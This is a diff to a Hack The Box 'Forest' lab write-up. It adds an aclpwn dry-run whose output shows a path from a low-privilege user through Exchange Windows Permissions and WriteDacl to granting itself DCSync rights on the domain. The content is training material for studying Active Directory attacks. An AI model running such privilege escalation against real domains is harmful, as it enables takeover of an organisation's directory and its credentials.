@@ -337,5 +337,13 @@ Info: Download successful!
 ```
 #### Shortest Path from Zer0Code to Domain Admins: 
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound2.png "BloodHound")
+
+```markdown
+root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry
+[+] Path found!
+Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+[+] Path validated, the following modifications are required for exploitation in the current configuration:
+[-] Modifying domain DACL to give DCSync rights to ZER0CODE
+'''
 ## Resources:
 [https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)
